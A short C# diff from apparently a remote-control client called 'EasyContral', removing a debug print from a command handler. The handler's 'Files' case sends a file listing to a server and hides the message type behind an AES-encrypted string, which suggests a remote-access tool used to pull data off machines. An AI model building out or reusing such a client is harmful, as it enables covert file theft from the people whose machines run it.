@@ -102,7 +102,6 @@ namespace EasyContral
                         case "Files":
                             string files = FileContral.GetFileList(Command);
                             //SendToServer(result, files, "FilesResult");
-                            Console.WriteLine("yyyy");
                             SendToServer(result, files, AESDecrypt("ZxFxSeeIg6vzRpV18NdzyQ==", Key, IV));
                             break;
                         case "File_Upload":
